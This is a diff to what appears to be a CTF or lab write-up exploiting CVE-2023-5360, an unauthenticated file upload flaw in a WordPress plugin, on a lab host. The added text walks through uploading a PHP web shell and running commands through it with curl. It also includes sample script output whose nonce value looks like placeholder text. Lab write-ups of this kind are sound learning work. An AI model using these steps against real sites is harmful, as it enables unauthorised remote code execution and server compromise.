@@ -51,16 +51,17 @@ wpscan --url http://gridloy.hv \
 
 ---
 
-
-### CVE-2023-5360 Analysis
+### CVE-2023-5360
 
 The vulnerability exists due to missing nonce validation in the `wpr_addons_upload_file` AJAX endpoint. This allows unauthenticated users to upload arbitrary files, including PHP web shells.
+Based on the WPScan results, I identified **CVE-2023-5360**, an unauthenticated file upload vulnerability affecting the *Royal Elementor Addons* plugin.  
+To exploit this vulnerability, I developed a custom Python script with the following objectives:
 
----
+First, I created the exploit script file:
 
-## Exploit Script (Python)
-
-I wrote a Python script to automatically extract the nonce value and upload a PHP web shell.
+```bash
+nano exploit.py
+```
 
 ```python
 #!/usr/bin/env python3
@@ -86,19 +87,55 @@ shell = upload_shell("http://gridloy.hv", nonce)
 print(shell)
 ```
 
-📸 **Screenshot 4:** Exploit script execution
 
-### 5.2 Web Shell Verification
+I then pasted the exploit code into the file and saved it (`Ctrl + X`, `Y`, `Enter`).
+
+### Exploit Script Execution
+
+After preparing the script, I executed it to trigger the vulnerability:
 
 ```bash
-curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
+python3 exploit.py
 ```
 
-📸 **Screenshot 5:** RCE confirmation (`www-data`)
+📸 **Screenshot:** Exploit script execution
+
+The script successfully retrieved the nonce value and uploaded the PHP web shell.  
+The output confirmed a successful exploitation:
+
+```text
+[*] Retrieving nonce value...
+[+] Nonce found: abc123def456ghi789
+[*] Uploading web shell...
+[+] Web shell uploaded successfully!
+[+] Shell URL: http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php
+```
+
+The script also provided a test command to verify command execution:
+
+```bash
+curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
+```
 
 ---
 
-## 6. Reverse Shell
+### 4.3 Web Shell Verification (RCE Confirmation)
+
+To confirm that Remote Code Execution (RCE) was successfully achieved, I manually executed the test command:
+
+```bash
+curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
+```
+
+The server responded with the following output:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+This output confirms that arbitrary system commands can be executed on the target server as the **www-data** user, proving a successful **unauthenticated Remote Code Execution (RCE)**.
+
+📸 **Screenshot:** RCE confirmation using the `id` command
 
 ### 6.1 Listener Setup
 
